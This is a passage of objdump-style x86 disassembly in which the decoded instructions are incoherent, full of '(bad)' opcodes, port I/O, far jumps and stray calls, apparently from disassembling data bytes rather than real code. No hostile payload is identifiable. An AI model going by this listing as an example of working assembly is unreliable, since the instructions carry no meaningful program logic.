  428f88:	shl    DWORD PTR [ebp+0x30],0x42
  428f8c:	push   0x766fdd34
  428f91:	fild   DWORD PTR [eax]
  428f93:	mov    ebx,0xc7ed0c04
  428f98:	loop   0x428fb9
  428f9a:	(bad)  
  428f9b:	leave  
  428f9c:	aas    
  428f9d:	iret   
  428f9e:	lea    eax,[edi+0x2e]
  428fa1:	and    al,0x54
  428fa3:	in     eax,dx
  428fa4:	repnz or eax,0x8446f871
  428faa:	mov    BYTE PTR [ebx+0x324b851e],cl
  428fb0:	addr16 push ds
  428fb2:	pop    ebx
  428fb3:	push   esp
  428fb4:	loop   0x428fc6
  428fb6:	sbb    dh,cl
  428fb8:	ret    
  428fb9:	mov    ds:0xdab565f5,eax
  428fbe:	test   esi,edi
  428fc0:	iret   
  428fc1:	adc    DWORD PTR [esi+0x4],edi
  428fc4:	xchg   edx,eax
  428fc5:	sub    BYTE PTR [edx],cl
  428fc7:	cwde   
  428fc8:	lock not DWORD PTR [ebp-0x44a0b5ba]
  428fcf:	xlat   BYTE PTR ds:[ebx]
  428fd0:	push   ss
  428fd1:	push   ss
  428fd2:	xor    DWORD PTR [eax],0x4a54c1a
  428fd8:	or     eax,0xd59d96fa
  428fdd:	sbb    al,0x7b
  428fdf:	fs pop es
  428fe1:	lods   al,BYTE PTR ds:[esi]
  428fe2:	repz jnp 0x42900b
  428fe5:	sbb    DWORD PTR [eax-0x35f6d8b0],edi
  428feb:	jecxz  0x428fc3
  428fed:	sub    edi,DWORD PTR [ebx-0x6f]
  428ff0:	mov    esp,0x9b821335
  428ff5:	fistp  QWORD PTR [ebx+edi*2]
  428ff8:	dec    ecx
  428ff9:	fldenv [eax+0x7d]
  428ffc:	fld    QWORD PTR fs:[eax]
  428fff:	popa   
  429000:	xchg   ebp,eax
  429001:	call   0x8a125f6f
  429006:	push   ebx
  429007:	daa    
  429008:	xor    eax,0x3b92f2c6
  42900d:	add    BYTE PTR [edi-0x2c],bl
  429010:	dec    edx
	...
  429071:	add    BYTE PTR [eax],al
  429073:	add    cl,ah
  429075:	in     al,dx
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0xabfc7b77
  429081:	(bad)  
  429082:	ror    BYTE PTR [ebp+0x41],cl
  429085:	mov    bh,0x1
  429087:	add    BYTE PTR ds:0x6a000001,al
  42908d:	dec    esp
  42908e:	dec    eax
  42908f:	inc    ebp
  429090:	jmp    0x65abf7c4
  429095:	retf   
  429096:	adc    BYTE PTR [esi-0x75],ch
  429099:	sub    eax,0xee7ad688
  42909e:	or     esi,DWORD PTR [ebx+0xfd68b32]
  4290a4:	cmc    
  4290a5:	push   ebp
  4290a6:	sbb    esp,DWORD PTR [ebp-0x4a]
  4290a9:	xchg   esp,eax
  4290aa:	cmp    eax,0x16bb4694
  4290af:	arpl   bp,dx
  4290b1:	ret    0xefc
  4290b4:	xor    BYTE PTR [ecx-0xe122cf8],dh
  4290ba:	and    BYTE PTR [edx],bh
  4290bc:	call   0x32a6:0xd3ab9663
  4290c3:	or     al,BYTE PTR [ecx-0x552aad84]
  4290c9:	pop    ebx
  4290ca:	outs   dx,DWORD PTR ds:[esi]
  4290cb:	adc    BYTE PTR [ebp+0x2e],dl
  4290ce:	lds    eax,FWORD PTR ds:0xc81e56c6
  4290d4:	xchg   esp,eax
  4290d5:	inc    edi
  4290d6:	mov    cl,0x2
  4290d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290d9:	jmp    0x1aceb109
  4290de:	push   0xef59d822
  4290e3:	add    eax,0x7ed8fd40
  4290e8:	pop    ds
  4290e9:	lds    esp,FWORD PTR [esi+ebp*2]
  4290ec:	jb     0x429085
  4290ee:	es jle 0x42914d
  4290f1:	fisttp WORD PTR [eax+0x809a0e9]
  4290f7:	pop    ebp
  4290f8:	es cld 
  4290fa:	call   0x5766dd95
  4290ff:	or     DWORD PTR [edx-0x88fe7ab],ecx
  429105:	push   esp
  429106:	out    dx,al
  429107:	jmp    0x2b6aa3d8
  42910c:	test   BYTE PTR [ecx+eax*8+0x4615746b],0xec
  429114:	inc    esp
  429115:	push   edx
  429116:	xchg   esi,eax
  429117:	cld    
  429118:	int    0x51
  42911a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42911b:	push   eax
  42911c:	lods   al,BYTE PTR ds:[esi]
  42911d:	xchg   ebp,eax
  42911e:	cmp    al,ch
  429120:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429121:	inc    esi
  429122:	mov    eax,edx
  429124:	xchg   esp,eax
  429125:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  429127:	xchg   edi,eax
  429128:	jl     0x42911b
  42912a:	add    esi,esi
  42912c:	sub    dh,BYTE PTR [esi+0x56]
  42912f:	mov    eax,0x9ff5aca3
  429134:	imul   esp,DWORD PTR [ebx],0xffffffcf
  429137:	xchg   ebp,ecx
  429139:	pop    esp
  42913a:	jmp    0xec76:0x99370989
  429141:	or     edx,ebp
  429143:	cmp    al,0xc7
  429145:	cli    
  429146:	out    dx,eax
  429147:	and    al,BYTE PTR [edi-0x35]
  42914a:	mov    BYTE PTR [edi+0x10ad2949],bh
  429150:	(bad)  [ecx]
  429152:	mov    al,ds:0xa2cd984
  429157:	and    ah,BYTE PTR [eax]
  429159:	xchg   bl,ch
  42915b:	cmp    esp,DWORD PTR [ebp-0x76]
  42915e:	adc    BYTE PTR [esi+edi*4],cl
  429161:	pop    edx
  429162:	jmp    0x429120
  429164:	mov    esi,0x2ebfab09
  429169:	jge    0x42912b
  42916b:	pushf  
  42916c:	push   ss
  42916d:	cmp    ah,bl
  42916f:	and    eax,0xe31433fd
  429174:	xchg   edi,eax
  429175:	repz scas eax,DWORD PTR es:[edi]
  429177:	outs   dx,DWORD PTR ds:[esi]
  429178:	out    dx,eax
  429179:	popa   
  42917a:	mov    dh,0x64
  42917c:	stc    
  42917d:	and    ebx,DWORD PTR [eax]
  42917f:	fsubr  QWORD PTR [ebx+0x17392151]
  429185:	repnz addr16 (bad) 
  429188:	jl     0x429171
  42918a:	mov    eax,0x82ceb99c
  42918f:	nop
  429190:	xlat   BYTE PTR ds:[ebx]
	...
  4291f1:	add    BYTE PTR [eax],al
  4291f3:	add    BYTE PTR [esi-0x79],dl
  4291f6:	std    
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [ebx+ebp*2+0x46ce46c5],0x50001b8
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    dh,ch
  42920d:	cmp    ah,BYTE PTR [ebx-0x46dab7c9]
  429213:	mov    ah,0xef
  429215:	xchg   edx,eax
  429216:	and    eax,0xfa7b345f
  42921b:	cmp    al,0x79
  42921d:	pop    ds
  42921e:	cwde   
  42921f:	xor    DWORD PTR [ecx],edx
  429221:	mov    DWORD PTR [eax-0x34d0d94d],eax
  429227:	sbb    ecx,DWORD PTR [ecx-0x47]
  42922a:	pop    esp
  42922b:	imul   ebx,DWORD PTR [eax-0x5e],0xc17d9b0c
  429232:	pop    ds
  429233:	sar    DWORD PTR [ebx+0x62],0x8b
  429237:	ins    DWORD PTR es:[edi],dx
  429238:	sub    eax,0xdce28e97
  42923d:	hlt    
  42923e:	sub    BYTE PTR [esi-0x4d],ah
  429241:	cdq    
  429242:	(bad)  
  429243:	data16 jns 0x42928e
  429246:	mov    esi,0x84b6a84c
  42924b:	jle    0x4291d3
  42924d:	out    0x47,al
  42924f:	loope  0x4291d7
  429251:	mov    BYTE PTR [esi+0x1d],0x15
  429255:	jmp    0x4291de
  429257:	out    0x60,al
  429259:	out    dx,eax
  42925a:	lods   eax,DWORD PTR ds:[esi]
  42925b:	and    eax,0xf1d0103b
  429260:	dec    eax
  429261:	push   ebp
  429262:	cmp    BYTE PTR [ecx+0x39],cl
  429265:	(bad)  
  429266:	aaa    
  429267:	xor    eax,0xe167e2ea
  42926c:	jmp    0x429276
  42926e:	mov    WORD PTR [esi+0xf],?
  429271:	add    al,BYTE PTR [edx+0x77d264d4]
  429277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429278:	lahf   
  429279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42927a:	inc    esi
  42927b:	pop    esi
  42927c:	jo     0x4292de
  42927e:	sbb    ch,ah
  429280:	dec    edi
  429281:	fidiv  DWORD PTR [edi-0x6009eaf7]
  429287:	int    0x92
  429289:	and    DWORD PTR [edi+eiz*8-0x1c],ebp
  42928d:	and    edx,ebp
  42928f:	cmp    ch,BYTE PTR [esi+0x1923d5c3]
  429295:	inc    ebp
  429296:	xor    BYTE PTR [edx-0x19850e27],bl
  42929c:	popa   
  42929d:	inc    esp
  42929e:	int3   
  42929f:	lods   al,BYTE PTR ds:[esi]
  4292a0:	stos   DWORD PTR es:[edi],eax
  4292a1:	add    al,0xe3
  4292a3:	neg    BYTE PTR [esi+0x60]
  4292a6:	int    0x3b
  4292a8:	and    al,BYTE PTR [ebp-0x6efdf5df]
  4292ae:	shl    BYTE PTR [edi+0x7507c9d5],cl
  4292b4:	cmc    
  4292b5:	and    bh,cl
  4292b7:	mov    dl,0xfe
  4292b9:	sub    dh,BYTE PTR [eax]
  4292bb:	int3   
  4292bc:	pop    ebx
  4292bd:	or     bh,BYTE PTR [eax]
  4292bf:	in     eax,dx
  4292c0:	mov    dh,0x1e
  4292c2:	adc    al,BYTE PTR [edi-0xc]
  4292c5:	sar    DWORD PTR [esp+edi*8-0x50],cl
  4292c9:	test   DWORD PTR [eax-0x76],ebx
  4292cc:	(bad)  
  4292cd:	jg     0x42929e
  4292cf:	mov    al,0x62
  4292d1:	mov    ?,WORD PTR [edx+0x1fc057ba]
  4292d7:	dec    esi
  4292d8:	pop    ebp
  4292d9:	imul   eax,DWORD PTR [ebp+ebp*1-0x48],0x20
  4292de:	(bad)  
  4292df:	jmp    0x4292c7
  4292e1:	(bad)  
  4292e3:	dec    edx
  4292e4:	sub    BYTE PTR [ecx+0x6522be72],cl
  4292ea:	push   eax
  4292eb:	fild   WORD PTR gs:[ebx+0x62ac6ff5]
  4292f2:	jge    0x42935e
  4292f4:	ret    
  4292f5:	div    DWORD PTR [ebx-0x7c1aab9b]
  4292fb:	fcom   QWORD PTR [edi]
  4292fd:	pop    DWORD PTR [eax-0x273c8933]
  429303:	push   ds
  429304:	icebp  
  429305:	mov    bh,BYTE PTR [esi]
  429307:	and    eax,DWORD PTR [ecx]
  429309:	rcl    DWORD PTR [ecx+0x551e1695],1
  42930f:	xor    al,0x94
	...
  429371:	add    BYTE PTR [eax],al
  429373:	add    al,dh
  429375:	adc    al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0xf9
  429381:	push   ss
  429382:	fsubr  DWORD PTR [ebx]
  429384:	dec    ebx
  429385:	mov    ecx,0x1050001
  42938a:	add    BYTE PTR [eax],al
  42938c:	mov    ebx,0xf463c419
  429391:	or     BYTE PTR [esi+0x44],bl
  429394:	cmp    eax,0x9c078901
  429399:	inc    esp
  42939a:	shl    BYTE PTR [edi-0x1b10bd9a],0xa6
  4293a1:	fcomp  DWORD PTR [ecx]
  4293a3:	pop    edi
  4293a4:	rcl    DWORD PTR [esi+edi*8-0x3a53fa8a],0xcd
  4293ac:	std    
  4293ad:	mov    eax,ds:0x70c89c0a
  4293b2:	jg     0x429393
  4293b4:	jno    0x4293a1
  4293b6:	xor    al,0x3c
  4293b8:	pop    esp
  4293b9:	fstp   TBYTE PTR [edx]
  4293bb:	sbb    BYTE PTR [ebx+0x40b4183f],al
  4293c1:	sbb    cl,BYTE PTR [ebp+0x6132e16d]
  4293c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4293c8:	fisttp WORD PTR [ecx+0x2e0e9167]
  4293ce:	jbe    0x429371
  4293d0:	aas    
  4293d1:	mov    ebx,0xfe196c88
  4293d6:	pop    ebp
  4293d7:	je     0x42944d
  4293d9:	shl    DWORD PTR [esi-0x6a],cl
  4293dc:	push   0xffffffd4
  4293de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4293df:	mov    ebx,0x5cb086f8
  4293e4:	cdq    
  4293e5:	mov    ebx,0x7a14b76b
  4293ea:	aam    0x80
  4293ec:	inc    edx
  4293ed:	mov    BYTE PTR [eax],cl
  4293ef:	in     al,0xd4
  4293f1:	xchg   edi,eax
  4293f2:	mov    ebp,DWORD PTR [edi]
  4293f4:	ret    
  4293f5:	xlat   BYTE PTR ds:[ebx]
  4293f6:	jb     0x42945e
  4293f8:	or     eax,0x33b50d62
  4293fd:	aam    0x9e
  4293ff:	mov    edi,0x99e1235e
  429404:	push   esp
  429405:	test   al,0x48
  429407:	out    dx,eax
  429408:	xchg   ebp,eax
  429409:	and    BYTE PTR [eax-0x76],0x19
  42940d:	cmc    
  42940e:	sub    al,0xdd
  429410:	shr    DWORD PTR [ecx+0x35],cl
  429413:	cld    
  429414:	stc    
  429415:	adc    esi,DWORD PTR [edi+0x2f]
  429418:	sbb    al,BYTE PTR [eax-0x285d65e5]
  42941e:	sbb    BYTE PTR [edx-0x21],al
  429421:	push   eax
  429422:	(bad)  
  429424:	or     eax,0xcab8bd62
  429429:	arpl   WORD PTR [eax],dx
  42942b:	mov    edx,0x71584c5a
  429430:	into   
  429431:	out    0x38,al
  429433:	and    eax,0xbaae2673
  429438:	mov    dh,0x7b
  42943a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42943b:	stos   DWORD PTR es:[edi],eax
  42943c:	sti    
  42943d:	in     eax,dx
  42943e:	pop    eax
  42943f:	fstp   TBYTE PTR [esi-0x78]
  429442:	jp     0x429427
  429444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429445:	or     edx,DWORD PTR [ebp+0x3d7f81e6]
  42944b:	xor    BYTE PTR ss:[di-0x37ea],dh
  429451:	ret    0x3fbc
  429454:	dec    esi
  429455:	aaa    
  429456:	fadd   DWORD PTR [eax-0x7fb2df5d]
  42945c:	int    0xf9
  42945e:	mov    edi,0xf247e8a2
  429463:	dec    edx
  429464:	jecxz  0x42942a
  429466:	push   edx
  429467:	mov    eax,0x6acc234b
  42946c:	mov    dl,BYTE PTR [ebx]
  42946e:	ss mov ebp,0x4db73f90
  429474:	sub    DWORD PTR [esp+esi*8+0x786f5a42],ebp
  42947b:	and    al,0x98
  42947d:	outs   dx,DWORD PTR ds:[esi]
  42947e:	and    eax,0x7e558d09
  429483:	(bad)  
  429484:	aad    0x4b
  429486:	sbb    eax,0x5a26d82
  42948b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42948c:	scas   eax,DWORD PTR es:[edi]
  42948d:	enter  0xd984,0x41
	...
  4294f1:	add    BYTE PTR [eax],al
  4294f3:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  4294f7:	sub    al,0x53
  4294f9:	ds jg  0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp+0x107af2ea],dx
  429503:	pop    edx
  429504:	push   eax
  429505:	mov    edx,0x1050001
  42950a:	add    BYTE PTR [eax],al
  42950c:	mov    bl,0x50
  42950e:	fld    TBYTE PTR [edx]
  429510:	xchg   esi,eax
  429511:	call   0xc3d0430c
  429516:	jecxz  0x42958f
  429518:	jle    0x284d360e
  42951e:	mov    esi,0x5edc45d2
  429523:	mov    edi,0xf18d1b30
  429528:	and    ebx,eax
  42952a:	xchg   DWORD PTR [edx+0x4f],ecx
  42952d:	pusha  
  42952e:	dec    esi
  42952f:	dec    edx
  429530:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429531:	jo     0x429548
  429533:	pop    esi
  429534:	add    al,0x3a
  429536:	pop    edx
  429537:	cmp    BYTE PTR [ecx+0x2f],cl
  42953a:	leave  
  42953b:	sub    bh,0x94
  42953e:	int3   
  42953f:	xchg   edi,eax
  429540:	and    DWORD PTR [edi+0x776b74c6],ebp
  429546:	sbb    eax,0xa6eafb87
  42954b:	dec    edi
  42954c:	sar    BYTE PTR [eax+0x1e593427],cl
  429552:	adc    bh,BYTE PTR [edx-0x5c]
  429555:	icebp  
  429556:	shl    DWORD PTR [edx+0x17],cl
  429559:	sub    ebp,DWORD PTR [ebx+0x5f]
  42955c:	out    0x27,al
  42955e:	pop    edx
  42955f:	jmp    0x4295a7
  429561:	sbb    cl,dl
  429563:	sbb    edx,DWORD PTR [ecx+0x3ab80fb9]
  429569:	lea    edx,[edi-0x9]
  42956c:	dec    esi
  42956d:	push   ebp
  42956e:	pop    ss
  42956f:	sub    eax,0x6ce0d6f6
  429574:	mov    ?,WORD PTR [ecx-0x36482fe4]
  42957a:	and    BYTE PTR [ecx-0x7a29b25a],cl
  429580:	jns    0x42958b
  429582:	cmc    
  429583:	mov    ebx,0x36f66c48
  429588:	test   BYTE PTR [edx-0x11d7e31a],dh
  42958e:	sub    BYTE PTR [ebx+0x66d91c98],ah
  429594:	mov    ebp,0xbdedd78c
  429599:	cdq    
  42959a:	mov    ch,0xf2
  42959c:	ins    DWORD PTR es:[edi],dx
  42959d:	dec    ebp
  42959e:	in     al,0x46
  4295a0:	sbb    BYTE PTR [ecx-0x49],cl
  4295a3:	mov    ecx,0x58fe5737
  4295a8:	cs pop ecx
  4295aa:	inc    esp
  4295ab:	mov    DWORD PTR [ebx+edi*2+0x1f],0xc372c124
  4295b3:	lds    esp,FWORD PTR [esi+0x798516a7]
  4295b9:	ror    BYTE PTR [eax+0x73],cl
  4295bc:	inc    BYTE PTR [ebx-0x28]
  4295bf:	xor    cx,WORD PTR [eax+0x5b2cf195]
  4295c6:	jns    0x429571
  4295c8:	xchg   ecx,eax
  4295c9:	pop    ebp
  4295ca:	mov    ebp,0xbaaa365d
  4295cf:	iret   
  4295d0:	mov    ebp,0x92dacd2d
  4295d5:	aad    0x83
  4295d7:	mov    esi,0x5b51458f
  4295dc:	(bad)  
  4295dd:	xchg   edi,eax
  4295de:	fwait
  4295df:	or     al,0x86
  4295e1:	xchg   edi,eax
  4295e2:	mov    dh,0x26
  4295e4:	push   esp
  4295e5:	xor    al,0x5b
  4295e7:	adc    DWORD PTR [edx+0x5ff12ac3],eax
  4295ed:	xchg   DWORD PTR [esi+0x5fc5f5a1],ebp
  4295f3:	adc    al,0xb5
  4295f5:	aaa    
  4295f6:	mov    dh,BYTE PTR [esi-0x3f0247d2]
  4295fc:	int3   
  4295fd:	xor    eax,0x82453e7d
  429602:	ins    BYTE PTR es:[edi],dx
  429603:	xchg   esp,eax
  429604:	dec    eax
  429605:	push   ds
  429606:	cmp    cl,al
  429608:	js     0x429628
  42960a:	jb     0x4295a0
  42960c:	loopne 0x4295e3
  42960e:	in     eax,dx
  42960f:	pop    edi
  429610:	mov    BYTE PTR [eax],0x0
	...
  429673:	add    BYTE PTR [ebp+0x1d],ch
  429676:	out    0xc0,al
  429678:	idiv   bl
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	test   edi,esi
  429682:	loope  0x4296b0
  429684:	push   ebp
  429685:	mov    ebx,0x1050001
  42968a:	add    BYTE PTR [eax],al
  42968c:	dec    ebx
  42968d:	cmc    
  42968e:	outs   dx,DWORD PTR ds:[esi]
  42968f:	repz test BYTE PTR [ecx-0x60],dh
  429693:	scas   al,BYTE PTR es:[edi]
  429694:	mov    bh,0xf0
  429696:	(bad)  
  429697:	or     eax,0x71d5a564
  42969c:	and    cl,BYTE PTR [ecx+0x58]
  42969f:	out    0x35,eax
  4296a1:	jae    0x4296c4
  4296a3:	inc    esi
  4296a4:	jmp    0x4296b4
  4296a6:	mov    dl,0x8d
  4296a8:	out    0xa4,eax
  4296aa:	dec    edx
  4296ab:	or     eax,0x1b351c12
  4296b0:	(bad)  
  4296b1:	in     eax,0xda
  4296b3:	push   edx
  4296b4:	(bad)
  4296b8:	lock push 0xa92a0597
  4296be:	(bad)  
  4296bf:	jg     0x429699
  4296c1:	pop    ecx
  4296c2:	shr    DWORD PTR [edi-0x13],0xbc
  4296c6:	jecxz  0x42965d
  4296c8:	jge    0x4296ee
  4296ca:	fcom   DWORD PTR ds:0xbb59a8d2
  4296d0:	sub    BYTE PTR [edx+0x7d908422],ah
  4296d6:	jle    0x42969b
  4296d8:	sbb    edx,DWORD PTR [ecx]
  4296da:	test   BYTE PTR [edx],0x78
  4296dd:	clc    
  4296de:	cmp    ecx,DWORD PTR [ecx+0x552ce8d3]
  4296e4:	push   ss
  4296e5:	inc    ebp
  4296e6:	scas   eax,DWORD PTR es:[edi]
  4296e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4296e8:	xchg   ecx,eax
  4296e9:	mov    bl,0xc8
  4296eb:	dec    ecx
  4296ec:	cwde   
  4296ed:	popa   
  4296ee:	pop    edi
  4296ef:	and    BYTE PTR [esi],al
  4296f1:	mov    ds,edx
  4296f3:	call   0xb000ddc3
  4296f8:	call   0x4010f9e1
  4296fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4296fe:	jnp    0x429768
  429700:	mov    eax,0x29c650b1
  429705:	push   esi
  429706:	test   eax,0x5b8e0fd6
  42970b:	mov    ebx,0xd788d9d8
  429710:	jle    0x429743
  429712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429713:	or     al,0xc1
  429715:	leave  
  429716:	or     eax,0x19
  429719:	fstp   TBYTE PTR [eax]
  42971b:	inc    esi
  42971c:	inc    edx
  42971d:	stc    
  42971e:	xor    ah,bh
  429720:	push   ebx
  429721:	dec    esi
  429722:	or     ch,al
  429724:	les    edx,FWORD PTR ds:0xfe915674
  42972a:	(bad)  
  42972b:	jmp    0x42978c
  42972d:	mov    eax,ds:0x4179d39e
  429732:	enter  0x4a79,0x1a
  429736:	fwait
  429737:	add    ah,al
  429739:	xchg   edx,eax
  42973a:	push   es
  42973b:	test   al,0xee
  42973d:	ss adc esi,eax
  429740:	pop    esp
  429741:	pop    ds
  429742:	adc    al,0x7a
  429744:	loop   0x42975e
  429746:	add    ebp,DWORD PTR [ebp-0x4a]
  429749:	jmp    0x3604:0x9b50b60d
  429750:	inc    edx
  429751:	std    
  429752:	xchg   esp,eax
  429753:	push   cs
  429754:	sub    al,0x9b
  429756:	gs test al,0xbf
  429759:	dec    edi
  42975a:	jmp    0xf528:0x7074f920
  429761:	int    0x6c
  429763:	je     0x4297ac
  429765:	mov    dl,ah
  429767:	je     0x429732
  429769:	adc    DWORD PTR [ebx+edi*2+0x5c],0x4582c30f
  429771:	jmp    0x566b5796
  429776:	mov    esi,0x8c1ce5b7
  42977b:	pop    ss
  42977c:	push   esi
  42977d:	jg     0x4297eb
  42977f:	sbb    al,0xd6
  429781:	jecxz  0x42972b
  429783:	jl     0x429765
  429785:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429786:	addr16 xor al,0xca
  429789:	mov    ecx,0xb583bb34
  42978e:	rol    BYTE PTR [edx+0x5d],0x0
	...
  4297f2:	add    BYTE PTR [eax],al
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	push   esi
  429801:	loop   0x429821
  429803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429804:	pop    edx
  429805:	mov    esp,0x1050001
  42980a:	add    BYTE PTR [eax],al
  42980c:	inc    ecx
  42980d:	mov    ds:0xaf432a70,al
  429812:	xchg   DWORD PTR [edi-0x5bc4fbc5],ebp
  429818:	ret    
  429819:	outs   dx,BYTE PTR ds:[esi]
  42981a:	inc    esp
  42981b:	mov    dh,0x48
  42981d:	sbb    BYTE PTR [ecx-0x64],al
  429820:	xchg   esi,eax
  429821:	sub    eax,0x3301edbb
  429826:	repz inc edx
  429828:	ficomp DWORD PTR [esi-0x4a]
  42982b:	and    al,bl
  42982d:	mov    al,0x12
  42982f:	(bad)  
  429830:	mov    BYTE PTR [bp+si+0x5a24],0x1e
  429836:	or     ah,dh
  429838:	pop    ecx
  429839:	out    dx,eax
  42983a:	fisub  DWORD PTR [ebp+0x479bf072]
  429840:	dec    eax
  429841:	sti    
  429842:	nop
  429843:	fisub  WORD PTR [edx+0x3fc423e8]
  429849:	push   eax
  42984a:	mov    dl,0xad
  42984c:	fs in  eax,dx
  42984e:	push   es
  42984f:	les    ecx,FWORD PTR [esp+ebp*1+0x19]
  429853:	mov    al,BYTE PTR ds:0x1946d69
  429859:	add    eax,0x6e32c2bb
  42985e:	(bad)  
  42985f:	popf   
  429860:	sar    BYTE PTR [edx],1
  429862:	fcomp  DWORD PTR [esi+0x34760bd]
  429868:	(bad)  
  429869:	(bad)  
  42986a:	push   edx
  42986b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42986c:	jg     0x4298d2
  42986e:	xchg   esi,eax
  42986f:	out    0xb7,eax
  429871:	jbe    0x4298a7
  429873:	cmp    al,0xff
  429875:	and    edx,edx
  429877:	sbb    BYTE PTR [edi-0x441f5848],0xab
  42987e:	mov    ah,BYTE PTR [esi]
  429880:	mov    DWORD PTR [edx+0x1a34bef0],esp
  429886:	rol    BYTE PTR [eax+ebp*2],0x0
  42988a:	add    cl,BYTE PTR [eax+0x7f2082a9]
  429890:	or     bh,BYTE PTR [ebx]
  429892:	mov    bl,0x33
  429894:	in     eax,dx
  429895:	(bad)  
  429898:	ret    
  429899:	and    eax,eax
  42989b:	mov    edx,0x635c2f47
  4298a0:	dec    ebp
  4298a1:	nop
  4298a2:	lods   eax,DWORD PTR ds:[esi]
  4298a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4298a4:	inc    ecx
  4298a5:	sti    
  4298a6:	sbb    dl,bh
  4298a8:	add    BYTE PTR [ebx+0x661fd364],bl
  4298ae:	sub    BYTE PTR [esi],dh
  4298b0:	pop    ds
  4298b1:	loopne 0x429878
  4298b3:	lods   al,BYTE PTR ds:[esi]
  4298b4:	xchg   esp,eax
  4298b5:	and    al,0xbe
  4298b7:	add    eax,0xb03a4660
  4298bc:	sub    eax,0x2e4bd886
  4298c1:	daa    
  4298c2:	cdq    
  4298c3:	pop    eax
  4298c4:	inc    esp
  4298c5:	in     al,dx
  4298c6:	dec    esi
  4298c8:	adc    eax,0x3450e9a0
  4298cd:	xchg   ecx,eax
  4298ce:	xlat   BYTE PTR ds:[ebx]
  4298cf:	inc    esp
  4298d0:	out    0xaa,eax
  4298d2:	push   esi
  4298d3:	add    al,0xd1
  4298d5:	cld    
  4298d6:	hlt    
  4298d7:	xchg   DWORD PTR [ebp+0x2c45f60a],ebp
  4298dd:	nop
  4298de:	sub    ch,cl
  4298e0:	rcr    eax,0xb8
  4298e3:	int3   
  4298e4:	mov    cl,0xf7
  4298e6:	cmp    eax,0x7a100207
  4298eb:	fmulp  st(1),st
  4298ed:	jecxz  0x429872
  4298ef:	fidiv  DWORD PTR [ecx]
  4298f1:	lock jae 0x429923
  4298f4:	sub    eax,0x707c242
  4298f9:	aam    0x92
  4298fb:	loop   0x429942
  4298fd:	(bad)  
  4298fe:	cld    
  4298ff:	jmp    0xafee:0x902bbbfb
  429906:	sub    eax,0x9781b766
  42990b:	mov    ds:0xd49afe90,eax
  429910:	cld    
	...
  429971:	add    BYTE PTR [eax],al
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	add    ebx,DWORD PTR [edi+edi*8+0x1b]
  429984:	pop    edi
  429985:	mov    ebp,0x1050001
  42998a:	add    BYTE PTR [eax],al
  42998c:	retf   
  42998d:	add    bh,BYTE PTR [ebx-0x2fc2ec53]
  429993:	lds    edx,FWORD PTR [edx-0x15]
  429996:	pop    ds
  429997:	in     al,0x22
  429999:	jecxz  0x4299d8
  42999b:	push   0xf01cb7a6
  4299a0:	icebp  
  4299a1:	push   edi
  4299a2:	loope  0x4299fc
  4299a4:	jb     0x429a1a
  4299a6:	(bad)  
  4299a7:	out    dx,al
  4299a8:	add    al,0x4c
  4299aa:	stc    
  4299ab:	jne    0x42997b
  4299ad:	lds    esp,FWORD PTR [esi+0x6bef5488]
  4299b3:	mov    ebp,0x5427122c
  4299b8:	xchg   ebx,eax
  4299b9:	mov    dh,0xea
  4299bb:	jns    0x429992
  4299bd:	or     DWORD PTR [ebx+edx*4+0x69fbaafc],esi
  4299c4:	sbb    al,0x6b
  4299c6:	mov    al,0x85
  4299c8:	jl     0x429965
  4299ca:	pushf  
  4299cb:	test   esi,ebx
  4299cd:	lock retf 0x550c
  4299d1:	ror    ebx,0x7d
  4299d4:	aas    
  4299d5:	mov    edi,0x28400ccc
  4299da:	loope  0x4299bc
  4299dc:	test   ah,ah
  4299de:	fwait
  4299df:	xchg   ecx,eax
  4299e0:	lock ds mov edi,0xa4c0f2f1
  4299e7:	push   ss
  4299e8:	ror    bh,0xc0
  4299eb:	leave  
  4299ec:	aaa    
  4299ed:	xor    al,bl
  4299ef:	ror    ah,1
  4299f1:	mov    al,ds:0xa1176999
  4299f6:	add    bh,BYTE PTR [esi+0x7f8ece55]
  4299fc:	stos   DWORD PTR es:[edi],eax
  4299fd:	sar    DWORD PTR [edi+ebx*1+0x6a],cl
  429a01:	mov    ch,0xb4
  429a03:	ja     0x4299b9
  429a05:	jne    0x429a05
  429a07:	ror    cl,1
  429a09:	push   ecx
  429a0a:	in     al,dx
  429a0b:	mov    ?,WORD PTR [eax]
  429a0d:	xchg   ecx,eax
